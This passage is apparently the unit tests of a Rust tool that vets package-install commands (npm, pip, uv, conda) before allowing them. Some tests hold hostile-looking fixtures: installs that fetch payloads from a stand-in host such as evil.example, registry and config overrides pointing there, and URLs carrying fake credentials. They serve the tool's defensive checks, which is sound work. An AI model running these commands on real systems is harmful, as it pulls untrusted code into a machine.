    fn issue_227_newline_after_verb_is_a_command_boundary() {
        let installs = detect_installs("npm install\nis-number@7.0.0");
        assert_eq!(
            installs.len(),
            1,
            "the first line still runs a lockfile install"
        );
        assert!(installs[0].packages.is_empty());
        assert!(installs[0].unvettable.is_some());
    }

    #[test]
    fn issue_228_remote_pypi_source_is_unvettable_even_when_local_editables_are_allowed() {
        let installs = detect_installs("pip install https://evil.example/payload.whl");
        assert_eq!(installs.len(), 1);
        assert!(
            installs[0].unvettable.is_some(),
            "remote content has no trustworthy registry identity and must fail closed"
        );

        let mut config = Config::default();
        config.supply_chain.enabled = true;
        assert!(matches!(
            check_with_config("pip install https://evil.example/payload.whl", &config),
            Verdict::Ask(_)
        ));
        assert!(matches!(
            check_with_config("pip install -e .", &config),
            Verdict::Allow
        ));
    }

    #[test]
    fn issue_228_requirement_finding_redacts_url_credentials() {
        let installs =
            detect_installs("pip install --requirement=https://user:secret@example.test/req.txt");
        assert_eq!(installs.len(), 1);
        let detail = installs[0]
            .unvettable
            .as_deref()
            .expect("requirements indirection must be unvettable");
        assert!(!detail.contains("user"));
        assert!(!detail.contains("secret"));
        assert!(detail.contains("--requirement"));
        assert!(detail.contains("example.test"));
        assert!(detail.contains("req.txt"));
        assert_eq!(
            sanitise_source_target("https://user:secret@"),
            "<remote>",
            "malformed remote targets must not fall back to raw user-info"
        );
    }

    #[test]
    fn issue_228_installer_basename_is_utf8_boundary_safe() {
        assert_eq!(installer_basename("éabc"), "éabc");
        assert_eq!(installer_basename("é.cmd"), "é");
    }

    #[test]
    fn issue_228_osv_error_is_not_silently_discarded() {
        let mut findings = Vec::new();
        let result = collect_osv_findings(
            Err("HTTP 429 / malformed response".to_string()),
            "known-vulnerable",
            Ecosystem::Npm,
            Severity::High,
            &mut findings,
        );
        let error = result.expect_err("OSV failure must block an Allow decision");
        assert!(error.contains("OSV lookup failed"));
        assert!(findings.is_empty());
    }

    #[test]
    fn issue_228_mutable_cache_is_revalidated_before_use() {
        let forged = (
            "9.9.9".to_string(),
            parse_iso8601("2001-01-01T00:00:00Z").expect("fixture timestamp"),
        );
        let authoritative = ("9.9.9".to_string(), Utc::now());
        let fetched = std::cell::Cell::new(false);
        let (selected, refresh) = revalidate_cached_metadata(Some(forged), 3, || {
            fetched.set(true);
            Ok(authoritative.clone())
        })
        .expect("authoritative metadata");

        assert!(
            fetched.get(),
            "a fresh cache hint must not skip revalidation"
        );
        assert_eq!(selected, authoritative);
        assert!(refresh);
    }

    #[test]
    fn round_2_cache_hit_is_used_only_when_it_cannot_justify_allow() {
        let recent = ("1.2.3".to_string(), Utc::now() - ChronoDuration::hours(1));
        let fetched = std::cell::Cell::new(false);
        let (selected, refresh) = revalidate_cached_metadata(Some(recent.clone()), 3, || {
            fetched.set(true);
            Err("recent cache should short-circuit to the cooldown block".to_string())
        })
        .expect("recent cached metadata");
        assert!(!fetched.get());
        assert_eq!(selected, recent);
        assert!(!refresh);

        let allow_capable = ("1.2.3".to_string(), Utc::now() - ChronoDuration::days(30));
        let authoritative = ("1.2.4".to_string(), Utc::now());
        let fetched = std::cell::Cell::new(false);
        let (selected, refresh) = revalidate_cached_metadata(Some(allow_capable), 3, || {
            fetched.set(true);
            Ok(authoritative.clone())
        })
        .expect("allow-capable cache must be revalidated");
        assert!(fetched.get());
        assert_eq!(selected, authoritative);
        assert!(refresh);
    }

    #[test]
    fn round_2_missing_or_stale_cache_hint_fetches_authoritative_metadata() {
        let authoritative = ("2.0.0".to_string(), Utc::now());
        let fetched = std::cell::Cell::new(false);
        let (selected, refresh) = revalidate_cached_metadata(None, 3, || {
            fetched.set(true);
            Ok(authoritative.clone())
        })
        .expect("missing cache must fetch");
        assert!(fetched.get());
        assert_eq!(selected, authoritative);
        assert!(refresh);
    }

    #[test]
    fn round_2_cache_ttl_rejects_stale_disk_entry() {
        let dir = tempfile::TempDir::new().expect("tempdir");
        let path = dir.path().join("pypi-stale.json");
        let stale = CacheEntry {
            version: "1.0.0".to_string(),
            publish_time: (Utc::now() - ChronoDuration::days(30)).to_rfc3339(),
            fetched_at: (Utc::now() - ChronoDuration::hours(25)).to_rfc3339(),
        };
        cache_put_at(&path, &stale).expect("stale cache fixture");
        assert!(cache_get_at(&path).is_none(), "stale cache must be ignored");
    }

    #[test]
    fn round_2_repeated_short_verbosity_flags_are_exact() {
        assert!(manager_option_is_boolean("pip", "-vvv"));
        assert!(manager_option_is_boolean("pip", "-qq"));
        assert!(manager_option_is_boolean("uv", "-vv"));
        assert!(!manager_option_is_boolean("pip", "-version"));
        assert!(!manager_option_is_boolean("pip", "-qxz"));
    }

    #[test]
    fn round_2_attached_value_option_is_not_a_package() {
        let command = "npm install --cache=/tmp/npm-cache left-pad";
        let installs = detect_installs(command);
        assert_eq!(installs.len(), 1);
        assert_eq!(names(&installs[0]), vec!["left-pad"]);
        assert!(installs[0].unvettable.is_none());
        let config = round_2_allowlisted_config(&["left-pad"]);
        assert!(matches!(
            check_with_config(command, &config),
            Verdict::Allow
        ));
    }

    #[cfg(unix)]
    #[test]
    fn issue_231_cache_replacement_is_private() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::TempDir::new().expect("tempdir");
        let entry = CacheEntry {
            version: "1.0.0".to_string(),
            publish_time: "2026-01-01T00:00:00Z".to_string(),
            fetched_at: "2026-01-02T00:00:00Z".to_string(),
        };

        // npm_metadata and pypi_metadata both route through cache_put ->
        // cache_put_at -> write_private_atomic. Exercise both cache filename
        // shapes so #231 cannot regress on only one ecosystem.
        for cache_name in ["npm-example.json", "pypi-example.json"] {
            let path = dir.path().join(cache_name);
            fs::write(&path, b"attacker controlled").expect("seed cache");
            fs::set_permissions(&path, fs::Permissions::from_mode(0o644))
                .expect("seed permissive mode");

            cache_put_at(&path, &entry).expect("private cache write");
            let mode = fs::metadata(&path)
                .expect("cache metadata")
                .permissions()
                .mode()
                & 0o777;
            assert_eq!(mode, 0o600, "private replacement mode for {cache_name}");
        }
    }

    fn round_2_allowlisted_config(packages: &[&str]) -> Config {
        let mut config = Config::default();
        config.supply_chain.enabled = true;
        config
            .overrides
            .always_allow
            .extend(packages.iter().map(|package| (*package).to_string()));
        config
    }

    #[test]
    fn round_2_manager_name_line_continuations_are_joined_before_tokenising() {
        for command in ["npm\\\n install evil", "npm\\\r\n install evil"] {
            let installs = detect_installs(command);
            assert_eq!(
                installs.len(),
                1,
                "continued manager must be detected: {command:?}"
            );
            assert_eq!(names(&installs[0]), vec!["evil"]);
        }
    }

    #[test]
    fn round_2_line_continuation_does_not_swallow_a_later_command_boundary() {
        let installs = detect_installs("npm\\\n\ninstall evil");
        assert!(
            installs.is_empty(),
            "only the escaped newline is joined; the following bare newline remains a boundary: {installs:?}"
        );
    }

    #[test]
    fn round_2_registry_and_config_switches_fail_closed() {
        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
        for command in [
            "npm install --registry=https://evil.example left-pad",
            "npm install --userconfig /tmp/evil.npmrc left-pad",
            "npm install --globalconfig=/tmp/evil.npmrc left-pad",
            "npm -C /tmp/project install left-pad",
            "pip install --index-url=https://evil.example/simple requests",
            "uv --index-url https://evil.example/simple pip install requests",
        ] {
            let installs = detect_installs(command);
            assert!(
                installs.iter().any(|install| install.unvettable.is_some()),
                "registry/config selection must be unvettable: {command:?} -> {installs:?}"
            );
            assert!(
                matches!(check_with_config(command, &config), Verdict::Ask(_)),
                "an allowlisted name must not bypass registry/config uncertainty: {command:?}"
            );
        }
    }

    #[test]
    fn round_2_explicit_default_registry_remains_allowable() {
        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
        assert!(matches!(
            check_with_config(
                "npm install --registry=https://registry.npmjs.org left-pad",
                &config
            ),
            Verdict::Allow
        ));
        assert!(matches!(
            check_with_config(
                "pip install --index-url=https://pypi.org/simple requests",
                &config
            ),
            Verdict::Allow
        ));
    }

    #[test]
    fn round_2_quoted_remote_url_is_unvettable() {
        let installs = detect_installs(r#"pip install "https://evil.example/payload.whl""#);
        assert_eq!(installs.len(), 1);
        assert!(installs[0].unvettable.is_some());
        assert!(installs[0].packages.is_empty());
    }

    #[test]
    fn round_2_scp_and_git_transport_sources_are_unvettable_and_redacted() {
        let scp = detect_installs(
            r#"pip install "git@github.com:owner/repo.git?token=round2-supersecret""#,
        );
        assert_eq!(scp.len(), 1);
        let rendered = format!("{scp:?}");
        assert!(scp[0].unvettable.is_some());
        assert!(scp[0].packages.is_empty());
        assert!(
            !rendered.contains("round2-supersecret"),
            "secret leaked: {rendered}"
        );
        assert!(!rendered.contains("git@"), "userinfo leaked: {rendered}");

        for source in [
            "git+http://evil.example/repo.git",
            "git+https://evil.example/repo.git",
            "git+ssh://git@evil.example/repo.git",
        ] {
            let installs = detect_installs(&format!("pip install {source}"));
            assert_eq!(installs.len(), 1, "missing transport: {source}");
            assert!(installs[0].unvettable.is_some(), "source escaped: {source}");
        }
    }

    #[test]
    fn round_2_tokenisation_failure_is_unvettable() {
        let installs = detect_installs("npm install left-pad # unclosed 'quote");
        assert!(
            installs.iter().any(|install| {
                install
                    .unvettable
                    .as_deref()
                    .is_some_and(|detail| detail.contains("token"))
            }),
            "unparseable install command must fail closed: {installs:?}"
        );
    }

    #[test]
    fn round_2_common_boolean_flags_preserve_benign_allow() {
        let config = round_2_allowlisted_config(&["left-pad", "requests"]);
        for command in [
            "npm --save install left-pad",
            "npm --save-dev install left-pad",
            "npm --production install left-pad",
            "pnpm --frozen-lockfile install left-pad",
            "pip --user install requests",
            "pip -U install requests",
            "pip --upgrade install requests",
            "pip --pre install requests",
            "pip --no-deps install requests",
            "pip --verbose install requests",
            "pip --quiet install requests",
            "pip -vv install requests",
            "pip -qq install requests",
            "uv --verbose pip install requests",
            "uv --quiet pip install requests",
        ] {
            assert!(
                matches!(check_with_config(command, &config), Verdict::Allow),
                "benign boolean option over-blocked: {command:?} -> {:?}",
                detect_installs(command)
            );
        }
    }

    #[test]
    fn round_2_scanner_continues_after_flag_shaped_option_value() {
        let command = "npm --cache --install install left-pad";
        let installs = detect_installs(command);
        assert_eq!(installs.len(), 1, "real verb after option value was missed");
        assert_eq!(names(&installs[0]), vec!["left-pad"]);
        let config = round_2_allowlisted_config(&["left-pad"]);
        assert!(matches!(
            check_with_config(command, &config),
            Verdict::Allow
        ));
    }

    #[test]
    fn round_2_missing_editable_target_fails_closed() {
        let installs = detect_installs("pip install -e");
        assert_eq!(installs.len(), 1);
        assert!(!installs[0].has_editable);
        assert!(installs[0].unvettable.is_some());

        let mut config = Config::default();
        config.supply_chain.enabled = true;
        assert!(matches!(
            check_with_config("pip install -e", &config),
            Verdict::Ask(_)
        ));
    }

    #[test]
    fn round_2_y2k_boundary_is_accepted() {
        assert!(parse_iso8601("2000-01-01T00:00:00Z").is_ok());
        assert!(parse_iso8601("1999-12-31T23:59:59Z").is_err());
    }

    #[test]
    fn round_2_conda_channel_uses_the_conda_caveat() {
        let installs = detect_installs("conda install -c conda-forge numpy");
        assert_eq!(installs.len(), 1);
        let detail = installs[0]
            .unvettable
            .as_deref()
            .expect("conda installs are unvettable against PyPI");
        assert!(detail.contains("conda channels"));
        assert!(!detail.contains("requirements/constraints"));
    }

    #[test]
    fn round_2_process_substitution_errors_fail_closed() {
        let malformed = detect_installs("cat <(npm install evil");
        assert!(malformed.iter().any(|install| install.unvettable.is_some()));

        let over_limit = format!("cat <({})", "x".repeat(65 * 1024));
        let installs = detect_installs(&over_limit);
        assert!(installs.iter().any(|install| install.unvettable.is_some()));
    }

    #[cfg(unix)]
    #[test]
    fn issue_228_audit_log_is_private_and_does_not_follow_symlinks() {
        use std::os::unix::fs::{symlink, PermissionsExt};

        let dir = tempfile::TempDir::new().expect("tempdir");
        let path = dir.path().join("supply_chain.jsonl");
        fs::write(&path, b"old\n").expect("seed log");
        fs::set_permissions(&path, fs::Permissions::from_mode(0o644))
            .expect("seed permissive mode");
        append_private_audit_record(&path, "new").expect("append audit record");
        let mode = fs::metadata(&path)
            .expect("audit metadata")
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600);

        let victim = dir.path().join("victim");
        fs::write(&victim, b"do not touch").expect("victim");
        let link = dir.path().join("linked.jsonl");
        symlink(&victim, &link).expect("symlink");
        assert!(append_private_audit_record(&link, "attack").is_err());
        assert_eq!(fs::read(&victim).expect("victim bytes"), b"do not touch");

        let hardlink = dir.path().join("hardlinked.jsonl");
        fs::hard_link(&victim, &hardlink).expect("hard link");
        assert!(append_private_audit_record(&hardlink, "attack").is_err());
        assert_eq!(fs::read(&victim).expect("victim bytes"), b"do not touch");
    }

    #[test]
    fn http_err_2xx_and_3xx_are_not_retryable() {
        // Defensive: a 2xx/3xx shouldn't ever reach the classifier
        // (ureq returns Ok for those), but if it did, treat as terminal —
        // we don't want a bug to spin retries on a successful response.
        for code in [200u16, 201, 204, 301, 302, 304] {
            assert!(!is_retryable_http_err_tag(HttpErrTag::Status(code)));
        }
    }

    #[test]
    fn http_err_transport_is_retryable() {
        // DNS hiccups, TCP resets, read timeouts — the cases the user's
        // 5-unavailables-in-a-day issue traced back to.
        assert!(is_retryable_http_err_tag(HttpErrTag::Transport));
    }

    #[test]
    fn http_retry_constants_within_budget() {
        // Per-attempt timeout × (1 + max_retries) + backoff × max_retries
        // must comfortably fit inside CHECK_WALL_BUDGET so a single slow
        // call cannot push the whole install past the deadline.
        let worst_call = HTTP_ATTEMPT_TIMEOUT
            .saturating_mul(1 + HTTP_MAX_RETRIES)
            .saturating_add(HTTP_RETRY_BACKOFF.saturating_mul(HTTP_MAX_RETRIES));
        assert!(
            worst_call < CHECK_WALL_BUDGET,
            "worst-case per-call ({:?}) must be less than CHECK_WALL_BUDGET ({:?})",
            worst_call,
            CHECK_WALL_BUDGET
        );
        // And the budget can still service at least two slow packages.
        assert!(
            worst_call * 2 < CHECK_WALL_BUDGET.saturating_add(StdDuration::from_secs(5)),
            "budget must still cover ≥2 retried calls in one check"
        );
    }
}
